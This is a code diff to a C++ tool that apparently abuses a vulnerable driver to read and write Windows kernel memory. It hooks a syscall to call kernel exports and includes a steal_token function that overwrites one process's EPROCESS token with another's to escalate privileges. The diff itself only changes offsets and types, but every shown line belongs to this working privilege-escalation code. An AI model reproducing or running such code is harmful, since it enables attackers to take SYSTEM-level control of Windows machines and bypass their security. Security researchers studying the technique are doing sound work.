@@ -363,11 +363,11 @@ bool vdm::initialize() {
         if (!read(ntoskrnl_cr3, ps_initial_system_process, &ntoskrnl_eprocess, sizeof(ntoskrnl_eprocess)))
             break;
 
-        LARGE_INTEGER system_pid = {};
-        if (!read(ntoskrnl_cr3, ntoskrnl_eprocess + offsetof(_EPROCESS, UniqueProcessId), &system_pid, sizeof(_EPROCESS::UniqueProcessId)))
+        uint64_t system_pid = {};
+        if (!read(ntoskrnl_cr3, ntoskrnl_eprocess + offsets::EProcess::UniqueProcessId, &system_pid, sizeof(VOID*)))
             break;
 
-        if (system_pid.HighPart != SYSTEM_PID)
+        if (system_pid != SYSTEM_PID)
             break;
 
         const auto [syscall_name, module] = syscall_hook;
@@ -390,15 +390,15 @@ bool vdm::initialize() {
 uint64_t vdm::fetch_e_process(uint64_t pid) {
     const static auto ps_lookup_process_by_id = vdm::fetch_ntoskrnl_export("PsLookupProcessByProcessId");
 
-     using ps_lookup_process_by_process_id = NTSTATUS (*)(HANDLE ProcessId, _EPROCESS** Process);
-    _EPROCESS* e_process = nullptr;
+    using ps_lookup_process_by_process_id = NTSTATUS (*)(HANDLE ProcessId, uint64_t* Process);
+    uint64_t e_process = 0;
     const auto result = syscall<ps_lookup_process_by_process_id>(
             (void*)(ps_lookup_process_by_id),
             *reinterpret_cast<HANDLE*>(&pid),
             &e_process
     );
 
-    return reinterpret_cast<uint64_t>(e_process);
+    return e_process;
 }
 
 bool vdm::steal_token(uint64_t victim_e_process, uint64_t target_e_process) {
@@ -406,42 +406,44 @@ bool vdm::steal_token(uint64_t victim_e_process, uint64_t target_e_process) {
         return false;
 
     _EX_FAST_REF victim_process_token {};
-    if (!read(ntoskrnl_cr3, victim_e_process + offsetof(_EPROCESS, Token), &victim_process_token, sizeof(_EPROCESS::Token))) {
+    if (!read(ntoskrnl_cr3, victim_e_process + offsets::EProcess::Token, &victim_process_token, sizeof(_EX_FAST_REF))) {
         std::cout << "[!] Failed to read current process token" << std::endl;
         return false;
     }
 
     _EX_FAST_REF target_process_token {};
-    if (!read(ntoskrnl_cr3, target_e_process + offsetof(_EPROCESS, Token), &target_process_token, sizeof(_EPROCESS::Token))) {
+    if (!read(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
         std::cout << "[!] Failed to read target process token" << std::endl;
         return false;
     }
 
-    const auto victim_ref_count = (uint64_t)victim_process_token.Object & 0xF;
-    auto target_ref_count = (uint64_t)target_process_token.Object & 0xF;
+    constexpr uint64_t TOKEN_MASK = 0xF;
+
+    const auto victim_ref_count = reinterpret_cast<uint64_t>(victim_process_token.Object) & TOKEN_MASK;
+    const auto target_ref_count = reinterpret_cast<uint64_t>(target_process_token.Object) & TOKEN_MASK;
 
     std::cout << std::format("[*] Victim reference count: {}", victim_ref_count) << std::endl;
     std::cout << std::format("[*] Target reference count: {}", target_ref_count) << std::endl;
 
-    const auto victim_token_address = (uint64_t)victim_process_token.Object & -0xF;
-    auto target_token_address = (uint64_t)target_process_token.Object & -0xF;
+    const auto victim_token_address = reinterpret_cast<uint64_t>(victim_process_token.Object) & (UINT64_MAX - TOKEN_MASK);
+    auto target_token_address = reinterpret_cast<uint64_t>(target_process_token.Object) & (UINT64_MAX - TOKEN_MASK);
 
     std::cout << std::format("[*] Victim token address: 0x{:X}", victim_token_address) << std::endl;
     std::cout << std::format("[*] Target token address: 0x{:X}", target_token_address) << std::endl;
 
     target_process_token.Value = victim_process_token.Value;
 
-    if (!write(ntoskrnl_cr3, target_e_process + offsetof(_EPROCESS, Token), &target_process_token, sizeof(_EPROCESS::Token))) {
+    if (!write(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
         std::cout << "[!] Failed to write target process token to current process" << std::endl;
         return false;
     }
 
-    if (!read(ntoskrnl_cr3, target_e_process + offsetof(_EPROCESS, Token), &target_process_token, sizeof(_EPROCESS::Token))) {
+    if (!read(ntoskrnl_cr3, target_e_process + offsets::EProcess::Token, &target_process_token, sizeof(_EX_FAST_REF))) {
         std::cout << "[!] Failed to read target process token" << std::endl;
         return false;
     }
 
-    target_token_address = (uint64_t)target_process_token.Object & -0xF;
+    target_token_address = reinterpret_cast<uint64_t>(target_process_token.Object) & (UINT64_MAX - TOKEN_MASK);
     std::cout << std::format("[*] New target token address: 0x{:X}", target_token_address) << std::endl;
 
     return true;
